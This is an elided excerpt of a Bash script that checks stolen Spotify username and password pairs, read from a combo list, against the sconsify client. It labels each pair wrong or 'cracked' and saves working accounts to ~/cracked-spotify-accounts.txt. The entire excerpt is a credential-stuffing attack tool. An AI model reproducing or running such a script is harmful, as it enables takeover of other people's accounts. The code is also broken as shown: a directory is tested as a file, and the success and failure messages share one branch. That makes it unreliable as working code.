...
if [[ -f "/usr/include/portaudiocpp/" ]]; then
      echo -e "$basename$0: internal error: portaudio is required to be installed ...";
      exit 1
fi
  ...
  ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
     if [[ "$?" -eq "0" ]]; then
         echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
          ...
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" | tee ~/cracked-spotify-accounts.txt
      fi
done < $1
